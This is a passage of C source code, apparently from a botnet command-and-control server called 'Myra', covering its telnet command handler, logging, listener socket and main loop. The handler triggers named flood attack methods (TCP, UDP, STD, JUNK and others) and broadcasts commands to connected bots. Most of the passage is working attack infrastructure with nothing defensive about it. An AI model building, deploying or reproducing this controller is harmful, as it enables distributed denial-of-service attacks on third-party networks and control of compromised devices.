              sprintf(myra, "[+] \x1b[0m--- Results\x1b[0m --- [+]\r\n\x1b[0m%s\x1b[37m\r\n", buffer_IPL); // Output Results, From IP Lookup
            if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
              return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
          }
          else
          {
            //printf("[\x1b[31m-\x1b[37m] Failed to send request headers...\n");
            sprintf(myra, "\x1b[31m[IPLookup] Failed to send request headers...\r\n"); // Header Send[ Failed -- Probably Due To Some Sort Of DDoS Protection, [Cloudflare, Blazing, Etc..]
            if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
              return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
          }
        }
        close(ipl_integer_size); // Terminate Allocated Statement, Open Socket, May Cause Numerous Network Problems If Not Killed...
      }
    }
    if (strstr(myra_buffer_size, ".logout") || strstr(myra_buffer_size, ".LOGOUT")) // Logout Command, So The User Exits Safely And In Fashion.. Of course...
    {
      printf("\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser\e[38;5;134m:[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mHas Logged Out!\n", accounts[find_line].username, myra_buffer_size);                 // We Are Attempting To Logout!
      FILE *myra_log_file;                                                                                                                                                                                          // We Are Attempting To Logout!
      myra_log_file = fopen("logs/Myra_Logout.log", "a");                                                                                                                                                           // We Are Attempting To Logout!
      fprintf(myra_log_file, "\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m]\e[38;5;168m User\e[38;5;134m:[\e[38;5;168m%s\e[38;5;134m]\e[38;5;168m Has Logged Out!\n", accounts[find_line].username, myra_buffer_size); // We Are Attempting To Logout!
      fclose(myra_log_file);                                                                                                                                                                                        // We Are Attempting To Logout!
      goto finish_integer;                                                                                                                                                                                          // We Are Dropping Down to finish_integer:
    }                                                                                                                                                                                                               // Let Us Continue Our Journey!
    if (strstr(myra_buffer_size, "STOP"))                                                                                                                                                                           // STOP OUR ATTACK
    {                                                                                                                                                                                                               // Let Us Continue Our Journey!
      sprintf(myra, "              \e[38;5;225m╔═══════════════════════════════╗\r\n              \e[38;5;225m║      \e[38;5;168mWhy did you stop? ):     \e[38;5;225m║\r\n              \e[38;5;225m║  \e[38;5;168mTesting something perhaps?   \e[38;5;225m║\r\n              \e[38;5;225m║  \e[38;5;168mMeh, its oki, trim_integer stopped </3  \e[38;5;225m║\r\n              \e[38;5;225m╚═══════════════════════════════╝\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }                                      // Let Us Continue Our Journey!
    if (strstr(myra_buffer_size, "CRUSH")) // CRUSH ATTACK
    {                                      // Let Us Continue Our Journey!
      sprintf(myra, "     \e[38;5;225m╔══════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mAttack Sent!         \e[38;5;225m║      ╔════════════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mMethod: CRUSH        \e[38;5;225m╠══════╣ \e[38;5;168m. STOP to stop the attack! \e[38;5;225m║\r\n     \e[38;5;225m║ \e[38;5;168mUsage: STD unknown_integer TCP     \e[38;5;225m║      ╚════════════════════════════╝\r\n     \e[38;5;225m╚══════════════════════╝\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }                                      // Let Us Continue Our Journey!
    if (strstr(myra_buffer_size, "COMBO")) // COMBO ATTACK
    {                                      // Let Us Continue Our Journey!
      sprintf(myra, "     \e[38;5;225m╔══════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mAttack Sent!         \e[38;5;225m║      ╔════════════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mMethod: COMBO        \e[38;5;225m╠══════╣ \e[38;5;168m. STOP to stop the attack! \e[38;5;225m║\r\n     \e[38;5;225m║ \e[38;5;168mUsage: JUNK unknown_integer HOLD   \e[38;5;225m║      ╚════════════════════════════╝\r\n     \e[38;5;225m╚══════════════════════╝\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }                                    // Let Us Continue Our Journey!
    if (strstr(myra_buffer_size, "TCP")) // TCP ATTACK
    {                                    // Let Us Continue Our Journey!
      sprintf(myra, "     \e[38;5;225m╔══════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mAttack Sent!         \e[38;5;225m║      ╔════════════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mMethod: TCP          \e[38;5;225m╠══════╣ \e[38;5;168m. STOP to stop the attack! \e[38;5;225m║\r\n     \e[38;5;225m║ \e[38;5;168mUsage: TCPFLOOD      \e[38;5;225m║      ╚════════════════════════════╝\r\n     \e[38;5;225m╚══════════════════════╝\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }                                    // Let Us Continue Our Journey!
    if (strstr(myra_buffer_size, "UDP")) // UDP ATTACK
    {                                    // Let Us Continue Our Journey! ╚═════════════════════════════╝ X 31 ||
      sprintf(myra, "     \e[38;5;225m╔══════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mAttack Sent!        \e[38;5;225m ║      ╔════════════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mMethod: UDP         \e[38;5;225m ╠══════╣ \e[38;5;168m. STOP to stop the attack! \e[38;5;225m║\r\n     \e[38;5;225m║ \e[38;5;168mUsage: UDPFLOOD     \e[38;5;225m ║      ╚════════════════════════════╝\r\n     \e[38;5;225m╚══════════════════════╝\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }                                    // Let Us Continue Our Journey!
    if (strstr(myra_buffer_size, "STD")) // STD ATTACK
    {                                    // Let Us Continue Our Journey!
      sprintf(myra, "     \e[38;5;225m╔══════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mAttack Sent!      \e[38;5;225m   ║      ╔════════════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mMethod: STD       \e[38;5;225m   ╠══════╣ \e[38;5;168m. STOP to stop the attack! \e[38;5;225m║\r\n     \e[38;5;225m║ \e[38;5;168mUsage: STDFLOOD   \e[38;5;225m   ║      ╚════════════════════════════╝\r\n     \e[38;5;225m╚══════════════════════╝\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }                                      // Let Us Continue Our Journey!
    if (strstr(myra_buffer_size, "STOMP")) // STOMP ATTACK
    {                                      // Let Us Continue Our Journey!
      sprintf(myra, "     \e[38;5;225m╔════════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mAttack Sent!           \e[38;5;225m║      ╔════════════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mMethod: STOMP          \e[38;5;225m╠══════╣ \e[38;5;168m. STOP to stop the attack! \e[38;5;225m║\r\n     \e[38;5;225m║ \e[38;5;168mUsage: UDP unknown_integer STD unknown_integer TCP \e[38;5;225m║      ╚════════════════════════════╝\r\n     \e[38;5;225m╚════════════════════════╝\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }                                     // Let Us Continue Our Journey!
    if (strstr(myra_buffer_size, "JUNK")) // JUNK ATTACK
    {                                     // Let Us Continue Our Journey! ╚══════════════════════╝ unknown_integer 24 || ╔════════════════════════╗ unknown_integer 26
      sprintf(myra, "     \e[38;5;225m╔══════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mAttack Sent!        \e[38;5;225m ║      ╔════════════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mMethod: JUNK        \e[38;5;225m ╠══════╣ \e[38;5;168m. STOP to stop the attack! \e[38;5;225m║\r\n     \e[38;5;225m║ \e[38;5;168mUsage: JUNKFLOOD    \e[38;5;225m ║      ╚════════════════════════════╝\r\n     \e[38;5;225m╚══════════════════════╝\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }                                                                         // Let Us Continue Our Journey!
    if (strstr(myra_buffer_size, "EXIT") || strstr(myra_buffer_size, "exit")) // We Are Closing Connection!
    {                                                                         // Let Us Continue Our Journey!
      goto finish_integer;                                                    // We Are Dropping Down to finish_integer:
    }                                                                         // Let Us Continue Our Journey!
    trim_removev2(myra_buffer_size);
    sprintf(myra, "\e[38;5;134m[\e[38;5;225m%s\e[38;5;134m@\e[38;5;168mMyra\e[38;5;134m]\e[38;5;154m$\e[38;5;168m ", accounts[find_line].username, myra_buffer_size); // User Input - Hostname
    if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
      goto finish_integer; // // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    if (strlen(myra_buffer_size) == 0)
      continue;
    printf("\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser\e[38;5;134m:[\e[38;5;168m%s\e[38;5;134m] \e[38;5;225m- \e[38;5;168mCommand\e[38;5;134m:[\e[38;5;168m%s\e[38;5;134m]\n", accounts[find_line].username, myra_buffer_size);
    FILE *myra_log_file;
    myra_log_file = fopen("logs/Myra_C2.log", "a"); // Log Our User -- Just In Case There Are 'Certain Problems'
    fprintf(myra_log_file, "\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser\e[38;5;134m:[\e[38;5;168m%s\e[38;5;134m] \e[38;5;134m- \e[38;5;168mCommand\e[38;5;134m:[\e[38;5;168m%s\e[38;5;134m]\n", accounts[find_line].username, myra_buffer_size);
    fclose(myra_log_file);                                             // Close The Log File
    myra_broadcast(myra_buffer_size, clear_myra_broadcast, usernamez); // Broadcast The Following Stated -- [Buffer, clear_myra_broadcast, Usernames]
    memset(myra_buffer_size, 0, 3000);                                 // Set Data Block And Buffer Size --> 0 -- 3000
  }                                                                    // Let Us Continue Our Journey!
finish_integer:                                                        // cleanup dead socket
  managements[clear_myra_broadcast].transmitted_successfully = 0;      // Managments Connected, Decrease Value To The Following Value
  close(clear_myra_broadcast);                                         // Close..
  successful_transmission--;                                           // Display New Value [May Change Output Sequence Later.. It Is Quite Stable]
}

void *socket_interpretation_II(int port) // Void, Certain Elements That Will Tailor The Client... [SOCKET INTERPRETATION II.2] -- [STILL IN BETA STAGES, WORK IN PROGRESS...]
{
  int socket_file_descriptor1, socket_file_descriptor2;      // Create Integer For Socket-Feed, New Socket Feed, Automatically Will Write A New Call --
  socklen_t clilen;                                          // New Call Name - Unecessary, But Just Incase, Compiling Is Very Needy And Dependent..
  struct sockaddr_in serv_addr, cli_addr;                    // Create Struct. For Socket Address.. This Will Subside With Client Address
  socket_file_descriptor1 = socket(AF_INET, SOCK_STREAM, 0); // New Socket Interpreter -- [Made By Zach, I Will Change Subsiding Unit Once Connection Has Been Made]
  if (socket_file_descriptor1 < 0)
    perror("ERROR opening socket");             // Socket Error Handling, The Stated Integer Value SHOULD NOT Be Greater Than 0 If So, Display Error
  bzero((char *)&serv_addr, sizeof(serv_addr)); // We Will Char An Output Communication Towards The Socket, The Broadcast Will Be Constant
  serv_addr.sin_family = AF_INET;               // Our Socket Properties Will Be Set, Using AF_INET. Everything Together = Sin.Family
  serv_addr.sin_addr.s_addr = INADDR_ANY;       // Sin Address, Is The Internet Address, It Will Be Set Due To The Client Sending An Income Packet [Test Packet]
  serv_addr.sin_port = htons(port);             // Using 'htons' We Will Convert The Port Value, Into A Network Integer For The Server To Communicate Properly
  if (bind(socket_file_descriptor1, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    perror("[Myra] Screening Error"); // Error Handling Output - Probably Using The Same Port As The Listener
  listen(socket_file_descriptor1, 5); // Use Listen Function - Using The '5' Value
  clilen = sizeof(cli_addr);          // Define 'clilen' With The Size Of Our Client Address [ User Connecting To The C2 ]
  while (1)
  {
    printf("\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mIncoming User Connection From "); // Client Size == The IP Of The User Connecting
                                                                                                     /*
       #define MY_SOCK_PATH "/somepath"
       #define LISTEN_BACKLOG 50

       #define handle_error(msg) \
           do { perror(msg); exit(EXIT_FAILURE); } while (0)

       int
       main(int argc, char *argv[])
       {
           int sfd, cfd;
           struct sockaddr_un my_addr, peer_addr;
           socklen_t peer_addr_size;

           sfd = socket(AF_UNIX, SOCK_STREAM, 0);
           if (sfd == -1)
               handle_error("socket");

           memset(&my_addr, 0, sizeof(struct sockaddr_un));

           my_addr.sun_family = AF_UNIX;
           strncpy(my_addr.sun_path, MY_SOCK_PATH,
                   sizeof(my_addr.sun_path) - 1);

           if (bind(sfd, (struct sockaddr *) &my_addr,
                   sizeof(struct sockaddr_un)) == -1)
               handle_error("bind");

           if (listen(sfd, LISTEN_BACKLOG) == -1)
               handle_error("listen");

           peer_addr_size = sizeof(struct sockaddr_un);
           cfd = accept(sfd, (struct sockaddr *) &peer_addr,
                        &peer_addr_size);
           if (cfd == -1)
               handle_error("accept");

           /* Code to deal with incoming connection(s)...

           /* When no longer required, the socket pathname, MY_SOCK_PATH
              should be deleted using unlink(2) or remove(3)
*/
    myra_client_address(cli_addr);                                                                   // Set Client Address, As Variable In Order To Log
    FILE *myra_log_file;                                                                             // Use LogFILE Function
    myra_log_file = fopen("logs/Myra_Connection.log", "a");                                          // Create Our Log File..                           |Here Is The Output On The Admin Screen|
    fprintf(myra_log_file, "\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mIncoming User Connection From \e[38;5;168mIP:\e[38;5;134m[\e[38;5;168m%d.%d.%d.%d\e[38;5;134m]\n", cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00) >> 8, (cli_addr.sin_addr.s_addr & 0xFF0000) >> 16, (cli_addr.sin_addr.s_addr & 0xFF000000) >> 24);
    fclose(myra_log_file);                                                                            // Close Our Log File, After Connection [Client Address] Has Been Logged..
    socket_file_descriptor2 = accept(socket_file_descriptor1, (struct sockaddr *)&cli_addr, &clilen); // Accept New Socket, Minimises Error Of Binding Failure
    if (socket_file_descriptor2 < 0)
      perror("ERROR on accept");                                                       // Output An Acceptance -- Something's Went Wrong -- Hard To Detail
    pthread_t thread;                                                                  // Use Pthread, To Set All Network Functions As One Thread -- [So We Can Parse Threads To The Client]
    pthread_create(&thread, NULL, &myra_telnet_data, (void *)socket_file_descriptor2); // Create The Thread '&thread, NULL, &myra_telnet_data, (void *)socket_file_descriptor2'
  }
}

int main(int argc, char *argv[], void *sock) // Set Integers For Arguements - Then Char For Output Communication
{
  signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
  int s, threads, port;     // Creating Integers For 'Threads & Port'
  struct epoll_event event; // Create Struct, For EPOLL, We Will Use This For Our Sockets
  if (argc != 4)            // Set Argument Value, [Default Execution Output Argument Value]
  {
    fprintf(stderr, "\e[38;5;225mWelcome To Myra-\e[38;5;168mV\n");
    fprintf(stderr, "Usage: %s \e[38;5;225m[\e[38;5;168mport\e[38;5;225m] [\e[38;5;168mthreads\e[38;5;225m] [\e[38;5;168mcnc-port\e[38;5;225m]\n", argv[0]); // Display Help [Only If All Arguments Have Not Been Applied]
    exit(EXIT_FAILURE);                                                                                                                                      // No Failure, Just No Arguments
  }
  port = atoi(argv[3]);    // Set Argument Value '3' - For Port
  threads = atoi(argv[2]); // Set Argument Value '2' - For Threads
  if (threads > 1500)      // Thread Limit - Change It If You Want - These Are My Recommendations
  {
    printf("[Myra] Thread Limit Exceeded! Please Lower Threat Count!\n"); // Are You Stupid? - Do You Wanna Really Try To Broadcast With EXTREME Network Output??
    return 0;                                                             // Kill
  }
  else if (threads < 1000) // You Have Picked A Reasonible Thread Number - Thank You For Listening To Me :)
  {
    printf(""); // printf("Well Done You Absolute Uncultured Swine, You Aren't A Skid After All...");
  }
  printf("\e[38;5;225m╔═══════════════════════════════════╗\r\n\e[38;5;225m║         \e[38;5;134mWelcome To Myra           \e[38;5;225m║\r\n\e[38;5;225m║         \e[38;5;134mC2 x Telnet Layer         \e[38;5;225m╠════════╗\r\n\e[38;5;225m║  \e[38;5;134mServer Is Sucessfully Screened!  \e[38;5;225m║        ║     ╔════════════════════════╗\r\n\e[38;5;225m╚═════╦═════════════════════════════╝        ╚═════╣ \e[38;5;134mCreated By Zach        \e[38;5;225m║\r\n      \e[38;5;225m║                                            ╚═════╦══════════════════╝\r\n      \e[38;5;225m║   ╔════╗                                         \e[38;5;225m║\r\n      \e[38;5;225m╚═══╣ \e[38;5;134m<3 \e[38;5;225m╠═════╗         ╔════════════╗            \e[38;5;225m║\r\n          \e[38;5;225m╚════╝     ║         ║ \e[38;5;134mRIP Katura \e[38;5;225m╠════════════╝\r\n                     \e[38;5;225m║         ╚═══╦════════╝\r\n                     \e[38;5;225m║             ║\r\n                     \e[38;5;225m║             ║\r\n                     \e[38;5;225m╚═════════════╝\r\n");
  listeninginterpretation = socket_intepretation_modified(argv[1]); // try to create a listening socket, die if we can't
  if (listeninginterpretation == -1)
    abort(); // Killing Myself

  s = socket_interpretation_block_v1(listeninginterpretation); // try to make it nonblocking, die if we can't
  if (s == -1)
    abort(); // Killing Myself

  s = listen(listeninginterpretation, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
  if (s == -1)                                    // Check If I Wanna Die.
  {
    perror("myra_listening_interpretation : failed"); // Listen - Error
    abort();                                          // Yep, I wanna die..
  }
  bindinginterpreter = epoll_create1(0); // make an epoll listener, die if we can't
  if (bindinginterpreter == -1)          // Check If I Wanna Die Again..
  {
    perror("myra_socket_binding_epoll : failed"); // EPOLL_ERROR - Yeah...
    abort();                                      // Okay Sure, Let's Die..
  }
  event.data.fd = listeninginterpretation;                                           // EPOLL_EVENT DATA
  event.events = EPOLLIN | EPOLLET;                                                  // EPOLL_USE MODULES
  s = epoll_ctl(bindinginterpreter, EPOLL_CTL_ADD, listeninginterpretation, &event); // EPOLL_USE_MODULES -- USE FUNCTION : (bindinginterpreter, EPOLL_CTL_ADD, listeninginterpretation, &event)
  if (s == -1)                                                                       // Check If I Wanna Die Again..
  {
    perror("myra_epoll_ctl : failed");
    abort(); // Yeah, Let's Die.. One More Time..
  }
  pthread_t thread[threads + 0]; // Use Pthread Thread + 2, Because We Want A Strong Independent Connection
  while (threads--)              // While [Thread Count]
  {
    pthread_create(&thread[threads + 0], NULL, &epollEventLoop, (void *)NULL); // make a thread to command each bot individually
  }
  pthread_create(&thread[0], NULL, &socket_interpretation_II, port); // Make A Thread To Individually Subside The Network Functions To The Client
  while (1)                                                          // Let's Wait A WHILE... [1 Second.. We Want Stability.. Right??]
  {
    myra_broadcast("SUCC", -1, "STRING"); // Broadcast
    sleep(60);                            // Lemme Sleep The Thread For 60 Seconds..
  }
  close(listeninginterpretation); // Close The Listening FileD, Socket -- Terminate Concurrent Function
  return EXIT_SUCCESS;            // Exit Successfully, Using Return Statement.
} // Myra I [BETA] - 10
